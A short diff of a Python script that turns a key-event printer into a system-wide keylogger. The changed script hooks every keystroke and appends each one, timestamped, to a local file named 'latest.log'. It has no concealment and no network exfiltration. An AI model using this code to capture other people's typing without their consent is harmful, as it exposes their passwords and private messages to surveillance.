@@ -1,9 +1,16 @@
 import keyboard
+import logging
 
 
-def print_pressed_keys(event):
-    print(event)
+def save_key(event):
+    logging.info(str(event))
 
 
-keyboard.hook(print_pressed_keys)
-keyboard.wait()
+def logger():
+    logging.basicConfig(filename='latest.log', filemode='a', format='[%(asctime)s]: %(message)s', level=logging.INFO)
+    logging.info('__log start__')
+    keyboard.hook(save_key)
+    keyboard.wait()
+
+
+logger()
